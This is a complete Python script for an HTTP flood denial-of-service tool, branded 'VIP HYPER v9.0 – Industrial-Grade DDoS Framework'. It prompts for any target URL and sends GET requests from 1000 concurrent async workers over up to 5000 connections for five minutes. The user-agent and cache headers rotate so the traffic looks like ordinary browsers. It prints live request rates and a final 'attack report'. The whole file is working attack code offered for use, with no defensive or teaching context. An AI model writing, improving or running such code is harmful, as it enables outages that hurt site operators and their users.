import threading 
import asyncio
import aiohttp
import sys
import time
import os
import random
from dataclasses import dataclass
from concurrent.futures import ThreadPoolExecutor
from typing import List, Dict
import socket
import ssl

# Enhanced color handling without external dependencies
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

@dataclass
class AttackConfig:
    target_url: str
    max_threads: int = 1000
    max_connections: int = 5000
    duration: int = 300
    timeout: int = 10

class VIPHyperEngine:
    def __init__(self, config: AttackConfig):
        self.config = config
        self.stats = {
            'total_requests': 0,
            'successful_requests': 0,
            'failed_requests': 0,
            'start_time': 0,
            'current_rps': 0,
            'peak_rps': 0,
            'active_connections': 0
        }
        self._lock = threading.Lock()
        self._running = False
        
        # Enhanced headers database
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1"
        ]
        
        self._validate_target()

    def _validate_target(self):
        """Validate and prepare target URL"""
        if not self.config.target_url.startswith(('http://', 'https://')):
            self.config.target_url = f"http://{self.config.target_url}"
        print(f"{Colors.GREEN}[+] Target: {self.config.target_url}{Colors.END}")

    def display_banner(self):
        """Enhanced ASCII banner"""
        banner = f"""
{Colors.CYAN}
   ██▒   █▓ ▄▄▄       ██▓     ██░ ██  ▄▄▄       ██▓     ██▓    
  ▓██░   █▒▒████▄    ▓██▒    ▓██░ ██▒▒████▄    ▓██▒    ▓██▒    
   ▓██  █▒░▒██  ▀█▄  ▒██░    ▒██▀▀██░▒██  ▀█▄  ▒██░    ▒██░    
    ▒██ █░░░██▄▄▄▄██ ▒██░    ░▓█ ░██ ░██▄▄▄▄██ ▒██░    ▒██░    
     ▒▀█░   ▓█   ▓██▒░██████▒░▓█▒░██▓ ▓█   ▓██▒░██████▒░██████▒
     ░ ▐░   ▒▒   ▓▒█░░ ▒░▓  ░ ▒ ░░▒░▒ ▒▒   ▓▒█░░ ▒░▓  ░░ ▒░▓  ░
     ░ ░░    ▒   ▒▒ ░░ ░ ▒  ░ ▒ ░▒░ ░  ▒   ▒▒ ░░ ░ ▒  ░░ ░ ▒  ░
       ░░    ░   ▒     ░ ░    ░  ░░ ░  ░   ▒     ░ ░     ░ ░   
        ░        ░  ░    ░  ░ ░  ░  ░      ░  ░    ░  ░    ░  ░
       ░                                                        

              {Colors.RED}VIP HYPER v9.0 - MAXIMUM SPEED UPGRADE{Colors.END}
               {Colors.YELLOW}Industrial-Grade DDoS Framework{Colors.END}
{Colors.END}
        """
        print(banner)

    async def _create_session(self):
        """Create optimized aiohttp session with connection pooling"""
        connector = aiohttp.TCPConnector(
            limit=self.config.max_connections,
            limit_per_host=self.config.max_connections,
            ttl_dns_cache=300,
            verify_ssl=False
        )
        timeout = aiohttp.ClientTimeout(total=self.config.timeout)
        return aiohttp.ClientSession(connector=connector, timeout=timeout)

    async def _hyper_worker(self, worker_id: int, session: aiohttp.ClientSession, stop_event: threading.Event):
        """Ultra-fast worker with connection reuse"""
        local_count = 0
        local_success = 0
        
        while not stop_event.is_set():
            if time.time() - self.stats['start_time'] > self.config.duration:
                break
                
            try:
                headers = {
                    "User-Agent": random.choice(self.user_agents),
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.5",
                    "Accept-Encoding": "gzip, deflate",
                    "Connection": "keep-alive",
                    "Cache-Control": "no-cache"
                }
                
                async with session.get(self.config.target_url, headers=headers) as response:
                    local_count += 1
                    if response.status == 200:
                        local_success += 1
                        
                    # Batch update for performance
                    if local_count % 50 == 0:
                        self._update_stats(local_count, local_success)
                        local_count = 0
                        local_success = 0
                        
            except Exception as e:
                local_count += 1
                continue
                
        # Final update
        if local_count > 0:
            self._update_stats(local_count, local_success)

    def _update_stats(self, count: int, success: int):
        """Thread-safe statistics update"""
        with self._lock:
            self.stats['total_requests'] += count
            self.stats['successful_requests'] += success
            self.stats['failed_requests'] += (count - success)
            
            elapsed = time.time() - self.stats['start_time']
            if elapsed > 0:
                current_rps = self.stats['total_requests'] / elapsed
                self.stats['current_rps'] = current_rps
                self.stats['peak_rps'] = max(self.stats['peak_rps'], current_rps)

    def _live_monitor(self, stop_event: threading.Event):
        """Real-time performance monitoring"""
        last_count = 0
        last_time = time.time()
        
        while not stop_event.is_set():
            time.sleep(0.5)  # Faster updates for real-time feel
            
            with self._lock:
                total = self.stats['total_requests']
                success = self.stats['successful_requests']
                current_rps = self.stats['current_rps']
                elapsed = time.time() - self.stats['start_time']
                remaining = max(0, self.config.duration - elapsed)
            
            # Calculate instant RPS
            current_time = time.time()
            instant_rps = (total - last_count) / (current_time - last_time) if current_time > last_time else 0
            last_count = total
            last_time = current_time
            
            success_rate = (success / total * 100) if total > 0 else 0
            
            # Enhanced real-time display
            print(f"\r{Colors.BOLD}{Colors.CYAN}[⚡]{Colors.END} "
                  f"Time: {elapsed:.1f}s/{self.config.duration}s | "
                  f"Requests: {Colors.GREEN}{total:,}{Colors.END} | "
                  f"Success: {Colors.YELLOW}{success_rate:.1f}%{Colors.END} | "
                  f"RPS: {Colors.RED}{current_rps:.0f}{Colors.END} | "
                  f"Instant: {Colors.PURPLE}{instant_rps:.0f}{Colors.END} | "
                  f"ETA: {remaining:.1f}s", end='', flush=True)

    async def _run_async_attack(self, stop_event: threading.Event):
        """Main async attack coordinator"""
        session = await self._create_session()
        
        # Create worker tasks
        tasks = []
        for i in range(self.config.max_threads):
            task = asyncio.create_task(self._hyper_worker(i, session, stop_event))
            tasks.append(task)
        
        # Wait for duration or stop event
        try:
            await asyncio.sleep(self.config.duration)
        except:
            pass
        
        # Cleanup
        stop_event.set()
        for task in tasks:
            task.cancel()
        await session.close()

    def execute_attack(self):
        """Main attack execution"""
        self.display_banner()
        
        print(f"{Colors.GREEN}[+] Attack Configuration:{Colors.END}")
        print(f"    Target: {self.config.target_url}")
        print(f"    Threads: {self.config.max_threads}")
        print(f"    Connections: {self.config.max_connections}")
        print(f"    Duration: {self.config.duration}s")
        print(f"    Timeout: {self.config.timeout}s")
        print(f"{Colors.YELLOW}[+] Starting in 3 seconds...{Colors.END}")
        time.sleep(3)
        
        self.stats['start_time'] = time.time()
        stop_event = threading.Event()
        
        # Start monitoring thread
        monitor_thread = threading.Thread(target=self._live_monitor, args=(stop_event,))
        monitor_thread.daemon = True
        monitor_thread.start()
        
        # Run async attack
        try:
            asyncio.run(self._run_async_attack(stop_event))
        except KeyboardInterrupt:
            print(f"\n{Colors.RED}[!] Attack interrupted by user{Colors.END}")
        finally:
            stop_event.set()
            
        self._generate_report()

    def _generate_report(self):
        """Generate comprehensive attack report"""
        total_time = time.time() - self.stats['start_time']
        total_requests = self.stats['total_requests']
        success = self.stats['successful_requests']
        failed = self.stats['failed_requests']
        avg_rps = total_requests / total_time if total_time > 0 else 0
        success_rate = (success / total_requests * 100) if total_requests > 0 else 0
        
        print(f"\n\n{Colors.CYAN}{'='*80}{Colors.END}")
        print(f"{Colors.BOLD}{Colors.GREEN}🎯 VIP HYPER v9.0 - ATTACK REPORT{Colors.END}")
        print(f"{Colors.CYAN}{'='*80}{Colors.END}")
        print(f"📡 Target: {self.config.target_url}")
        print(f"⏱️  Duration: {total_time:.2f} seconds")
        print(f"🧵 Threads: {self.config.max_threads}")
        print(f"🔗 Connections: {self.config.max_connections}")
        print(f"📊 Total Requests: {Colors.GREEN}{total_requests:,}{Colors.END}")
        print(f"✅ Successful: {Colors.GREEN}{success:,}{Colors.END} ({success_rate:.1f}%)")
        print(f"❌ Failed: {Colors.RED}{failed:,}{Colors.END}")
        print(f"🔥 Average RPS: {Colors.YELLOW}{avg_rps:,.0f}{Colors.END}")
        print(f"⚡ Peak RPS: {Colors.RED}{self.stats['peak_rps']:,.0f}{Colors.END}")
        print(f"🎯 Efficiency: {Colors.CYAN}{(avg_rps/self.config.max_threads*100):.1f}%{Colors.END}")
        print(f"{Colors.CYAN}{'='*80}{Colors.END}")

def main():
    """Main interactive interface"""
    # Clear screen
    os.system('cls' if os.name == 'nt' else 'clear')
    
    # Get target URL
    target = input(f"{Colors.CYAN}[?] Enter target URL: {Colors.END}").strip()
    if not target:
        print(f"{Colors.RED}[!] Target URL is required{Colors.END}")
        return
    
    # Auto-configure for maximum performance
    config = AttackConfig(
        target_url=target,
        max_threads=1000,  # Increased from 500
        max_connections=5000,  # Massive connection pool
        duration=300,
        timeout=10
    )
    
    # Execute attack
    engine = VIPHyperEngine(config)
    engine.execute_attack()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Program terminated by user{Colors.END}")
    except Exception as e:
        print(f"\n{Colors.RED}[!] Error: {e}{Colors.END}")